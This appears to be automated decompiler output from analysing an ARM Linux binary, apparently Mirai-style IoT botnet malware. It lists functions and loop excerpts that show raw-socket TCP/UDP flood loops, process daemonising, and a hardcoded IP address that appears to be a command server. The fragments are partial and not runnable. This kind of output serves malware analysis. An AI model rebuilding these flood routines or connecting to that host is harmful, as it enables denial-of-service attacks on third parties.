// __pid_t getpid(void);
// __pid_t getppid(void);
// int getsockname(int fd, __SOCKADDR_ARG addr, socklen_t * restrict len);
// int getsockopt(int fd, int level, int optname, void * restrict optval, socklen_t * restrict optlen);
// in_addr_t inet_addr(const char * cp);
// int kill(__pid_t pid, int sig);
// int listen(int fd, int n);
// int open(const char * file, int oflag, ...);
// DIR * opendir(const char * name);
// ssize_t recv(int fd, void * buf, size_t n, int flags);
// ssize_t recvfrom(int fd, void * restrict buf, size_t n, int flags, __SOCKADDR_ARG addr, socklen_t * restrict addr_len);
// ssize_t send(int fd, const void * buf, size_t n, int flags);
// ssize_t sendto(int fd, const void * buf, size_t n, int flags, __CONST_SOCKADDR_ARG addr, socklen_t addr_len);
// int setsockopt(int fd, int level, int optname, const void * optval, socklen_t optlen);
// int sigprocmask(int how, const sigset_t * restrict set, sigset_t * restrict oset);
// int socket(int domain, int type, int protocol);
=================FUNCTION : function_99bc ===================
++++++++ FUNCTION START 16563
++++++++ FUNCTION END 16943
++++++++ FUNCTION LENGTH 380
    struct sockaddr * v124;
        while (true) {
            int32_t sock_fd = socket(AF_INET, 0, IPPROTO_IP); // 0x9b0c
            if (sock_fd == -1) {
            bind(sock_fd, (struct sockaddr *)&addr, 16);
            int32_t sock; // 0x9bb0
            connect(sock, (struct sockaddr *)addr2, 16);
            while (true) {
                while (true) {
                        int32_t sock2; // 0x9c28
                        send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                            send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                        int32_t sock3; // 0x9c7c
                        send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                            send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                    while (true) {
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_96d4 ===================
++++++++ FUNCTION START 16180
++++++++ FUNCTION END 16560
++++++++ FUNCTION LENGTH 380
    struct sockaddr * v124;
        while (true) {
            int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0x9824
            if (sock_fd == -1) {
            bind(sock_fd, (struct sockaddr *)&addr, 16);
            int32_t sock; // 0x98c8
            connect(sock, (struct sockaddr *)addr2, 16);
            while (true) {
                while (true) {
                        int32_t sock2; // 0x9940
                        send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                            send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
                        int32_t sock3; // 0x9994
                        send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                            send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
                    while (true) {
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_901c ===================
++++++++ FUNCTION START 14665
++++++++ FUNCTION END 15319
++++++++ FUNCTION LENGTH 654
    struct sockaddr * v124;
        while (true) {
                                        while (true) {
                                                free((int32_t *)v251);
                                            free((int32_t *)v251);
                                free((int32_t *)v251);
                            free((int32_t *)v251);
                    free((int32_t *)v251);
                free((int32_t *)v251);
                            while (true) {
                    free((int32_t *)v251);
                free((int32_t *)v251);
        free((int32_t *)v251);
    free((int32_t *)v251);
=================FUNCTION : function_d6a8 ===================
++++++++ FUNCTION START 21508
++++++++ FUNCTION END 22026
++++++++ FUNCTION LENGTH 518
    struct sockaddr * v123;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xd870
    int32_t fd = sock_fd; // sb
    if (sock_fd == -1) {
    if (setsockopt(SOL_IP, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        return close(fd);
        while (true) {
        while (true) {
            while (true) {
            while (true) {
                                            sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                        sendto(fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
    while (true) {
=================FUNCTION : function_cf34 ===================
++++++++ FUNCTION START 20970
++++++++ FUNCTION END 21505
++++++++ FUNCTION LENGTH 535
    struct sockaddr * v123;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xd138
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                        sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
        while (true) {
=================FUNCTION : function_b1c8 ===================
++++++++ FUNCTION START 18420
++++++++ FUNCTION END 18839
++++++++ FUNCTION LENGTH 419
    struct sockaddr * v124;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0xb2c8
    int32_t fd = sock_fd; // fp
    if (sock_fd == -1) {
    if (setsockopt(SOL_IP, SO_TYPE, option_name, &option_value, (int32_t)&option_len) == -1) {
        return close(fd);
        while (true) {
        while (true) {
            while (true) {
            while (true) {
                                sendto(fd, (int32_t *)message, v242 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
    while (true) {
=================FUNCTION : function_9ca4 ===================
++++++++ FUNCTION START 16946
++++++++ FUNCTION END 17444
++++++++ FUNCTION LENGTH 498
    struct sockaddr * v123;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0x9de0
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
            while (true) {
                while (true) {
                while (true) {
                                        sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
            while (true) {
    while (true) {
=================FUNCTION : function_a330 ===================
++++++++ FUNCTION START 17447
++++++++ FUNCTION END 17935
++++++++ FUNCTION LENGTH 488
    struct sockaddr * v123;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xa484
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                    sendto(sock_fd, (int32_t *)message, v242 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_aaac ===================
++++++++ FUNCTION START 17938
++++++++ FUNCTION END 18417
++++++++ FUNCTION LENGTH 479
    struct sockaddr * v123;
    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0xac00
    if (sock_fd == -1) {
    if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
        return close(sock_fd);
        while (true) {
    while (true) {
        while (true) {
        while (true) {
                                    sendto(sock_fd, (int32_t *)message, v242 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
        while (true) {
=================FUNCTION : function_13450 ===================
++++++++ FUNCTION START 38389
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
                while (true) {
                        while (true) {
                            while (true) {
                while (true) {
                    while (true) {
        while (true) {
    while (true) {
=================FUNCTION : function_132a4 ===================
++++++++ FUNCTION START 37406
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
    int32_t sock_fd = socket(AF_INET, 0, IPPROTO_IP); // 0x132cc
    if (sock_fd != -1) {
        int32_t sock = 2; // bp-40
        connect((int32_t)&sock, (struct sockaddr *)addr, addr);
        getsockname(sock_fd, (struct sockaddr *)&sock, &addr_len);
        close(sock_fd);
=================FUNCTION : function_f560 ===================
++++++++ FUNCTION START 25920
++++++++ FUNCTION END 26161
++++++++ FUNCTION LENGTH 241
    struct sockaddr * v120;
    int32_t pid = getpid(); // 0xf574
    int32_t v234 = pid ^ getppid();
    int32_t proc_time = clock(); // 0xf58c
    int32_t v235 = v234 ^ proc_time;
    int32_t v236 = proc_time;
    return proc_time;
=================FUNCTION : __modsi3 ===================
++++++++ FUNCTION START 40318
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : function_ecf0 ===================
++++++++ FUNCTION START 24755
++++++++ FUNCTION END 25026
++++++++ FUNCTION LENGTH 271
    struct sockaddr * v123;
    int32_t result = fork(); // 0xecf8
    int32_t fd = open((char *)function_1293c(23, (int32_t *)status), O_RDWR); // 0xed54
        int32_t fd2 = open((char *)function_1293c(24, (int32_t *)status), O_RDWR); // 0xedb0
    while (true) {
=================FUNCTION : __udivsi3 ===================
++++++++ FUNCTION START 38833
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
    while (true) {
                                while (true) {
                                    while (true) {
                while (true) {
=================FUNCTION : function_133cc ===================
++++++++ FUNCTION START 38001
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
                while (true) {
            while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __umodsi3 ===================
++++++++ FUNCTION START 39677
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
            while (true) {
                        while (true) {
                                while (true) {
                    while (true) {
=================FUNCTION : function_f76c ===================
++++++++ FUNCTION START 26715
++++++++ FUNCTION END 26975
++++++++ FUNCTION LENGTH 260
    struct sockaddr * v124;
    if (socket(AF_INET, SOCK_STREAM, IPPROTO_IP) == -1) {
        fcntl(fd, F_GETFL);
        int32_t sock; // 0xf80c
        result = connect(sock, (struct sockaddr *)&addr, 16);
=================FUNCTION : function_8f2c ===================
++++++++ FUNCTION START 14364
++++++++ FUNCTION END 14662
++++++++ FUNCTION LENGTH 298
    struct sockaddr * v123;
    int32_t result = fork(); // 0x8f44
            int32_t status2 = fork(); // 0x8f68
                kill(getppid(), SIGKILL);
                while (true) {
=================FUNCTION : function_9270 ===================
++++++++ FUNCTION START 15322
++++++++ FUNCTION END 15604
++++++++ FUNCTION LENGTH 282
    struct sockaddr * v124;
            return inet_addr((char *)cp);
    while (true) {
        return inet_addr((char *)cp);
=================FUNCTION : function_13118 ===================
++++++++ FUNCTION START 36660
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
    while (true) {
    while (true) {
    while (true) {
=================FUNCTION : function_13340 ===================
++++++++ FUNCTION START 37664
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
        while (true) {
    while (true) {
=================FUNCTION : function_13014 ===================
++++++++ FUNCTION START 35579
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
            while (true) {
    while (true) {
=================FUNCTION : _close ===================
++++++++ FUNCTION START 11853
++++++++ FUNCTION END 12093
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return close(fd);
=================FUNCTION : _recvfrom ===================
++++++++ FUNCTION START 3589
++++++++ FUNCTION END 3829
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return recvfrom(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : _connect ===================
++++++++ FUNCTION START 1402
++++++++ FUNCTION END 1642
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return connect(fd, addr, len);
=================FUNCTION : _getpid ===================
++++++++ FUNCTION START 2131
++++++++ FUNCTION END 2371
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return getpid();
=================FUNCTION : function_f688 ===================
++++++++ FUNCTION START 26427
++++++++ FUNCTION END 26712
++++++++ FUNCTION LENGTH 285
    struct sockaddr * v120;
    while (true) {
=================FUNCTION : _getppid ===================
++++++++ FUNCTION START 8936
++++++++ FUNCTION END 9176
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return getppid();
=================FUNCTION : _listen ===================
++++++++ FUNCTION START 7964
++++++++ FUNCTION END 8204
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return listen(fd, n);
=================FUNCTION : _inet_addr ===================
++++++++ FUNCTION START 6263
++++++++ FUNCTION END 6503
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return inet_addr(cp);
=================FUNCTION : _fork ===================
++++++++ FUNCTION START 8207
++++++++ FUNCTION END 8447
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return fork();
=================FUNCTION : function_13244 ===================
++++++++ FUNCTION START 37135
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
    while (true) {
=================FUNCTION : _open ===================
++++++++ FUNCTION START 10638
++++++++ FUNCTION END 10878
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return open(file, oflag);
=================FUNCTION : _socket ===================
++++++++ FUNCTION START 3832
++++++++ FUNCTION END 4072
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return socket(domain, type, protocol);
=================FUNCTION : _recv ===================
++++++++ FUNCTION START 1159
++++++++ FUNCTION END 1399
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return recv(fd, buf, n, flags);
=================FUNCTION : function_ec9c ===================
++++++++ FUNCTION START 24503
++++++++ FUNCTION END 24752
++++++++ FUNCTION LENGTH 249
    struct sockaddr * v124;
    int32_t v237 = inet_addr("209.141.53.227");
=================FUNCTION : function_130b0 ===================
++++++++ FUNCTION START 36388
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
    while (true) {
=================FUNCTION : _sigprocmask ===================
++++++++ FUNCTION START 12339
++++++++ FUNCTION END 12579
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return sigprocmask(how, set, oset);
=================FUNCTION : _setsockopt ===================
++++++++ FUNCTION START 6506
++++++++ FUNCTION END 6746
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return setsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : _kill ===================
++++++++ FUNCTION START 5777
++++++++ FUNCTION END 6017
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return kill(pid, sig);
=================FUNCTION : _getsockname ===================
++++++++ FUNCTION START 12582
++++++++ FUNCTION END 12822
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return getsockname(fd, addr, len);
=================FUNCTION : _closedir ===================
++++++++ FUNCTION START 11367
++++++++ FUNCTION END 11607
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return closedir(dirp);
=================FUNCTION : function_8ec8 ===================
++++++++ FUNCTION START 14089
++++++++ FUNCTION END 14361
++++++++ FUNCTION LENGTH 272
    struct sockaddr * v124;
    while (true) {
=================FUNCTION : function_92dc ===================
++++++++ FUNCTION START 15607
++++++++ FUNCTION END 15889
++++++++ FUNCTION LENGTH 282
    struct sockaddr * v124;
    while (true) {
=================FUNCTION : _getsockopt ===================
++++++++ FUNCTION START 9665
++++++++ FUNCTION END 9905
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return getsockopt(fd, level, optname, optval, optlen);
=================FUNCTION : _send ===================
++++++++ FUNCTION START 4804
++++++++ FUNCTION END 5044
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return send(fd, buf, n, flags);
=================FUNCTION : _sendto ===================
++++++++ FUNCTION START 7478
++++++++ FUNCTION END 7718
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    return sendto(fd, buf, n, flags, addr, addr_len);
=================FUNCTION : _select ===================
++++++++ FUNCTION START 4075
++++++++ FUNCTION END 4315
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_ddf4 ===================
++++++++ FUNCTION START 22029
++++++++ FUNCTION END 22308
++++++++ FUNCTION LENGTH 279
    struct sockaddr * v124;
=================FUNCTION : function_8e2c ===================
++++++++ FUNCTION START 13350
++++++++ FUNCTION END 13595
++++++++ FUNCTION LENGTH 245
    struct sockaddr * v124;
=================FUNCTION : function_f508 ===================
++++++++ FUNCTION START 25671
++++++++ FUNCTION END 25917
++++++++ FUNCTION LENGTH 246
    struct sockaddr * v120;
=================FUNCTION : _readlink ===================
++++++++ FUNCTION START 2860
++++++++ FUNCTION END 3100
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_12a20 ===================
++++++++ FUNCTION START 34733
++++++++ FUNCTION END 35013
++++++++ FUNCTION LENGTH 280
    struct sockaddr * v123;
=================FUNCTION : _sleep ===================
++++++++ FUNCTION START 3346
++++++++ FUNCTION END 3586
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : _setsid ===================
++++++++ FUNCTION START 11124
++++++++ FUNCTION END 11364
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_12968 ===================
++++++++ FUNCTION START 34450
++++++++ FUNCTION END 34730
++++++++ FUNCTION LENGTH 280
    struct sockaddr * v123;
=================FUNCTION : _sigaddset ===================
++++++++ FUNCTION START 4561
++++++++ FUNCTION END 4801
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : * ===================
++++++++ FUNCTION START 9908
++++++++ FUNCTION END 10148
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
    struct sockaddr * v124;
    struct sockaddr * v124;
    struct sockaddr * v124;
    struct sockaddr * v124;
    struct sockaddr * v124;
    struct sockaddr * v124;
=================FUNCTION : _prctl ===================
++++++++ FUNCTION START 2374
++++++++ FUNCTION END 2614
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_f5bc ===================
++++++++ FUNCTION START 26164
++++++++ FUNCTION END 26424
++++++++ FUNCTION LENGTH 260
    struct sockaddr * v124;
=================FUNCTION : function_f840 ===================
++++++++ FUNCTION START 26978
++++++++ FUNCTION END 27271
++++++++ FUNCTION LENGTH 293
    struct sockaddr * v120;
=================FUNCTION : _fcntl ===================
++++++++ FUNCTION START 11610
++++++++ FUNCTION END 11850
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : _clock ===================
++++++++ FUNCTION START 10881
++++++++ FUNCTION END 11121
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : __start ===================
++++++++ FUNCTION START 13842
++++++++ FUNCTION END 14086
++++++++ FUNCTION LENGTH 244
    struct sockaddr * v124;
=================FUNCTION : _bind ===================
++++++++ FUNCTION START 6020
++++++++ FUNCTION END 6260
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_934c ===================
++++++++ FUNCTION START 15892
++++++++ FUNCTION END 16177
++++++++ FUNCTION LENGTH 285
    struct sockaddr * v122;
=================FUNCTION : _time ===================
++++++++ FUNCTION START 9179
++++++++ FUNCTION END 9419
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_8b28 ===================
++++++++ FUNCTION START 178
++++++++ FUNCTION END 419
++++++++ FUNCTION LENGTH 241
    struct sockaddr * v126 = NULL;
=================FUNCTION : _read ===================
++++++++ FUNCTION START 6992
++++++++ FUNCTION END 7232
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : ___uClibc_main ===================
++++++++ FUNCTION START 8450
++++++++ FUNCTION END 8690
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_12fec ===================
++++++++ FUNCTION START 35323
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : _ioctl ===================
++++++++ FUNCTION START 916
++++++++ FUNCTION END 1156
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_1308c ===================
++++++++ FUNCTION START 36127
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : function_de50 ===================
++++++++ FUNCTION START 22311
++++++++ FUNCTION END 22621
++++++++ FUNCTION LENGTH 310
    struct sockaddr * v124;
=================FUNCTION : _write ===================
++++++++ FUNCTION START 5534
++++++++ FUNCTION END 5774
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : _sigemptyset ===================
++++++++ FUNCTION START 1645
++++++++ FUNCTION END 1885
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_13068 ===================
++++++++ FUNCTION START 35872
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : _unlink ===================
++++++++ FUNCTION START 7235
++++++++ FUNCTION END 7475
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_ec84 ===================
++++++++ FUNCTION START 24259
++++++++ FUNCTION END 24500
++++++++ FUNCTION LENGTH 241
    struct sockaddr * v123;
=================FUNCTION : function_13868 ===================
++++++++ FUNCTION START 41771
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : __aeabi_uidivmod ===================
++++++++ FUNCTION START 39434
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : function_12ad8 ===================
++++++++ FUNCTION START 35016
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v119;
=================FUNCTION : _atoi ===================
++++++++ FUNCTION START 10395
++++++++ FUNCTION END 10635
++++++++ FUNCTION LENGTH 240
    struct sockaddr * v124;
=================FUNCTION : function_1293c ===================
++++++++ FUNCTION START 34196
++++++++ FUNCTION END 34447
++++++++ FUNCTION LENGTH 251
    struct sockaddr * v124;
=================FUNCTION : function_8e20 ===================
++++++++ FUNCTION START 13100
++++++++ FUNCTION END 13347
++++++++ FUNCTION LENGTH 247
    struct sockaddr * v124;
=================FUNCTION : function_8dac ===================
++++++++ FUNCTION START 12825
++++++++ FUNCTION END 13097
++++++++ FUNCTION LENGTH 272
    struct sockaddr * v122;
=================FUNCTION : function_8b40 ===================
++++++++ FUNCTION START 422
++++++++ FUNCTION END 670
++++++++ FUNCTION LENGTH 248
    struct sockaddr * v123;
=================FUNCTION : function_13860 ===================
++++++++ FUNCTION START 41527
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : __aeabi_ldiv0 ===================
++++++++ FUNCTION START 41024
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v124;
=================FUNCTION : function_1382c ===================
++++++++ FUNCTION START 41268
++++++++ FUNCTION END 
++++++++ FUNCTION LENGTH 
    struct sockaddr * v123;
=================FUNCTION : function_8e84 ===================
++++++++ FUNCTION START 13598
++++++++ FUNCTION END 13839
++++++++ FUNCTION LENGTH 241
    struct sockaddr * v124;
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 3 @ function_901c ====================================
++++++++ WHILE START : 14965 
++++++++ WHILE FUNCTION : function_901c 
++++++++ WHILE END : 15180 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		free((int32_t *)v251);
		free((int32_t *)v251);
		free((int32_t *)v251);
		free((int32_t *)v251);
		free((int32_t *)v251);
		free((int32_t *)v251);
=============================WHILE LOOPS ID : 7 @ function_96d4 ====================================
++++++++ WHILE START : 16444 
++++++++ WHILE FUNCTION : function_96d4 
++++++++ WHILE END : 16482 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, 17, IPPROTO_UDP); // 0x9824
		if (sock_fd == -1) {
		bind(sock_fd, (struct sockaddr *)&addr, 16);
		int32_t sock; // 0x98c8
		connect(sock, (struct sockaddr *)addr2, 16);
=============================WHILE LOOPS ID : 8 @ function_96d4 ====================================
++++++++ WHILE START : 16486 
++++++++ WHILE FUNCTION : function_96d4 
++++++++ WHILE END : 16548 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock2; // 0x9940
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		int32_t sock3; // 0x9994
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 11 @ function_99bc ====================================
++++++++ WHILE START : 16827 
++++++++ WHILE FUNCTION : function_99bc 
++++++++ WHILE END : 16865 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd = socket(AF_INET, 0, IPPROTO_IP); // 0x9b0c
		if (sock_fd == -1) {
		bind(sock_fd, (struct sockaddr *)&addr, 16);
		int32_t sock; // 0x9bb0
		connect(sock, (struct sockaddr *)addr2, 16);
=============================WHILE LOOPS ID : 12 @ function_99bc ====================================
++++++++ WHILE START : 16869 
++++++++ WHILE FUNCTION : function_99bc 
++++++++ WHILE END : 16931 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t sock2; // 0x9c28
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		send(sock2, (int32_t *)buf, length, MSG_NOSIGNAL);
		int32_t sock3; // 0x9c7c
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		send(sock3, (int32_t *)buf2, length, MSG_NOSIGNAL);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 15 @ function_9ca4 ====================================
++++++++ WHILE START : 17262 
++++++++ WHILE FUNCTION : function_9ca4 
++++++++ WHILE END : 17405 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
=============================WHILE LOOPS ID : 19 @ function_a330 ====================================
++++++++ WHILE START : 17780 
++++++++ WHILE FUNCTION : function_a330 
++++++++ WHILE END : 17934 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, v242 + 66, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		while (true) {
=============================WHILE LOOPS ID : 21 @ function_aaac ====================================
++++++++ WHILE START : 18266 
++++++++ WHILE FUNCTION : function_aaac 
++++++++ WHILE END : 18416 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)message, v242 + 52, MSG_NOSIGNAL, (struct sockaddr *)(a2 + 24 * option_value), 16);
		while (true) {
=============================WHILE LOOPS ID : 23 @ function_b1c8 ====================================
++++++++ WHILE START : 18726 
++++++++ WHILE FUNCTION : function_b1c8 
++++++++ WHILE END : 18829 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		sendto(fd, (int32_t *)message, v242 + 32, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
=============================WHILE LOOPS ID : 25 @ function_b68c ====================================
++++++++ WHILE START : 19138 
++++++++ WHILE FUNCTION : function_b68c 
++++++++ WHILE END : 19512 
++++++++ INTRESTING INSTRUCTIONS :  
		result = inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		sendto(sock_fd, (int32_t *)fd, v249 + 47, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
		result = inet_addr((char *)&cp);
		sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
		if (sock_fd == -1) {
		if (setsockopt(sock_fd, 0, 3, &option_value, 4) == -1) {
		result2 = close(sock_fd);
		while (true) {
=============================WHILE LOOPS ID : 32 @ function_be3c ====================================
++++++++ WHILE START : 20088 
++++++++ WHILE FUNCTION : function_be3c 
++++++++ WHILE END : 20277 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc0a0107
		fd = sock_fd2;
		if (sock_fd2 != -1) {
		while (true) {
		fcntl(sock_fd2, F_GETFL);
		connect(fd, (struct sockaddr *)&addr, 16);
		while (true) {
		int32_t v267 = recvfrom(sock_fd, &buf, 256, MSG_NOSIGNAL, (struct sockaddr *)&addr2, &addr_len); // 0xc208
		close(fd);
		close(fd);
		int32_t sock_fd3 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc0a0
		fd = sock_fd3;
		if (sock_fd3 == -1) {
		sock_fd2 = sock_fd3;
=============================WHILE LOOPS ID : 33 @ function_be3c ====================================
++++++++ WHILE START : 20285 
++++++++ WHILE FUNCTION : function_be3c 
++++++++ WHILE END : 20356 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)(24 * option_value + a2), 16);
=============================WHILE LOOPS ID : 35 @ function_c6b8 ====================================
++++++++ WHILE START : 20673 
++++++++ WHILE FUNCTION : function_c6b8 
++++++++ WHILE END : 20862 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t sock_fd2 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0xc91c107
		fd = sock_fd2;
		if (sock_fd2 != -1) {
		while (true) {
		fcntl(sock_fd2, F_GETFL);
		connect(fd, (struct sockaddr *)&addr, 16);
		while (true) {
